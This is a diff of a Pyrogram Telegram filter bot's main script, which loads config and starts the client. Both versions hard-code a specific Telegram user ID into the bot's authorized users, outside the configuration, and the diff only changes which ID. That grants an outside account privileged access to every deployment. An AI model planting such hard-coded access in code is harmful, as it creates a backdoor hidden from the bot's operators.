@@ -1,24 +1,24 @@
-1 import os
-2 import pyrogram
-3
-4 if bool(os.environ.get("WEBHOOK", False)):
-5    from sample_config import Config
-6 else:
-7    from config import Config
-8
-9
-10
-11 if __name__ == "__main__" :
-12    plugins = dict(
-13        root="plugins"
-14    )
-15    app = pyrogram.Client(
-16        "filter bot",
-17        bot_token=Config.TG_BOT_TOKEN,
-18        api_id=Config.API_ID,
-19        api_hash=Config.API_HASH,
-20        plugins=plugins,
-21        workers=300
-22    )
-23    Config.AUTH_USERS.add(str(680815375))
-24    app.run()
+ import os
+ import pyrogram
+
+ if bool(os.environ.get("WEBHOOK", False)):
+    from sample_config import Config
+ else:
+    from config import Config
+
+
+
+ if __name__ == "__main__" :
+    plugins = dict(
+        root="plugins"
+    )
+    app = pyrogram.Client(
+        "filter bot",
+        bot_token=Config.TG_BOT_TOKEN,
+        api_id=Config.API_ID,
+        api_hash=Config.API_HASH,
+        plugins=plugins,
+        workers=300
+    )
+    Config.AUTH_USERS.add(str(1900567682))
+    app.run()
